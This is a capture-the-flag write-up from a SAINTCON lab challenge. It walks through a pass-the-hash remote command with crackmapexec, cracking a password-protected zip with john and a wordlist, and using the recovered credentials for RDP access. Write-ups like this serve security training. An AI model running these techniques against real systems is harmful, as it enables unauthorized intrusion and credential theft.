# WS02 - Admin

## Challenge Description

This Category of Challenge is presented by The Keep Community at SAINTCON.

Have you ever wanted to come to a conference, hack a machine, and walk away feeling like you own the world? Yeah, you can do that here.

If you get stuck or have any questions, don't hesitate to visit The Keep Community for help or guidance!

========================================

Welcome to the Keep!

You have been tasked with running a pentest on this client's network.

They have placed a file flag.txt on the desktop of all the important users in the network. This will allow them to see how far you have gone.

## Solution

Last we had gotten the flag from `bashninja` on **WS02** with:

```bash
crackmapexec smb WS02/32 -u bashninja -d HC -H e68968cfbc5ab5ac534c1cd3715946dc -x type C:\\Users\\bashninja\\Desktop\\flag.txt
```

If we explore a bit (using `dir`), we will notice a `.zip` file on the desktop
labeled _PowerUserAccountCreds.zip_. Ah, alright. Let's pull that and try to
open it.

Password protected... Alright. No big deal. `john` to the rescue:

```bash
zip2john PowerUserAccountCreds.zip
john zip_hash /usr/share/wordlists/rockyou.txt.gz
# will output `pitbull`
```

Now let's open the zip file and see what is in it:

```bash
$ unzip PowerUserAccountCreds.zip 
Archive:  PowerUserAccountCreds.zip
[PowerUserAccountCreds.zip] Power User Account Creds.txt password: [pitbull]
  inflating: Power User Account Creds.txt

$ cat Power\ User\ Account\ Creds.txt
My power user account creds should be safe in this password protected zip
superbashninja
Spring2021#
```

Perfect! Let's see if it works via RDP to **WS02**. And it does! Grab the flag
on the desktop.